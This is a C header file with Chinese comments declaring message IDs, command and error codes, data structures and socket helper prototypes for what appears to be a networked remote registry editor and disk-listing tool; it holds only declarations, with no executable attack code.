/*
*	公共变量,函数定义
*/
#pragma once
#include "resource.h"

//私有定义
#define WM_EDITLABLE			WM_USER + 900		//编辑标题
#define WM_SETMYCURSOR			WM_USER + 902		//光标控制
#define WM_REGLEFTDBCLICK		WM_USER + 903		//注册表树控件双击
#define WM_REGLEFTRCLICK		WM_USER + 904		//注册表树控件右键单击
#define WM_REGRIGHTRBCLICK		WM_USER + 905		//注册表编辑(右视单击)
#define WM_REGRIGHTRENAMEOK		WM_USER + 906		//更名键值成功  
#define WM_INSERTMYITEM			WM_USER + 912		//增加项目
#define WM_GETMYCOUNT			WM_USER + 913		//取对象数目

//公共定义

#define TRAN_DATA_LEN			2048 * 1024			//数据交换长度

#define REG_VALUE_INT			1					//DWORD型数据
#define REG_VALUE_BIN			2					//二进制型数据
#define REG_VALUE_STR			3					//字符串型数据

#define CLIENT_REG_QUERY		5011				//查询指定键值
#define CLIENT_REG_DELETE_KEY	5012				//删除子键
#define CLIENT_REG_RENAME_VALUE	5013				//更改键值名 
#define CLIENT_REG_DELETE_VALUE 5014				//删除键值
#define CLIENT_REG_EDIT_VALUE	5015				//更改键值
#define CLIENT_REG_CREATE_VALUE 5016				//新建键值
#define CLIENT_DISK_LIST		5008				//取磁盘列表

#define NOT_FIND_ANY_FILE		7000				//找不到任何文件
#define INVALID_COMMAND			7002				//无效命令
#define REG_DELETE_KEY_ERR		7008				//删除子键失败
#define REG_RENAME_VALUE_ERR	7009				//更名键值名失败
#define REG_CREATE_VALUE_ERR	7010				//创建新键值失败
#define REG_EDIT_VALUE_ERR		7011				//更改键值失败
#define RENAME_FAILE			7015				//更名失败
#define COMMAND_PARAM_ERR		7017				//参数错误
#define OPEB_REG_KEY_ERR		7018				//无法打开指定键值

#define TRANS_DATA_ERR			8000				//通信错误

#define CONN_FILE_REGD_SEND		4007				//注册表编辑发送管道
#define CONN_FILE_REGD_RECV		4008				//注册表编辑接收管道

typedef struct _REGINFO_
{
	char  m_Name[512];
	DWORD m_NameLen;
	DWORD m_DataType;
	char  m_Data[512];
	DWORD m_Datalen;
	BOOL  m_IsKey;
}REGINFO,*LPREGINFO;

typedef struct _CLIENTDATA_
{
	char*	m_TransData;
	DWORD	m_TransLen;
	HANDLE  m_WorkEvent;
	UINT	m_Command;
	HANDLE	m_ThreadHandle;
	SOCKET	m_SendSocket;
	SOCKET	m_RecvSocket;
	HWND	hParent;
	BOOL	m_IsWork;
}CLIENTDATA,*LPCLIENTDATA;

void TransBagThread(LPVOID lPvoid);

BOOL SendData(SOCKET s, char *data, int len);
BOOL RecvData(SOCKET s, char *data, int len);
BOOL ProcessOneTrans(LPCLIENTDATA pData);
BOOL SendBag(SOCKET s,char *Data,DWORD &len,UINT &command);
BOOL ReadBag(SOCKET s,char *Data,DWORD &len,UINT &command);
void BcdToAsc(unsigned char *BcdStr,unsigned char *AscStr,int BcdStrLen);
void AscToBcd(unsigned char *AscStr,unsigned char *BcdStr,int AscStrLen);
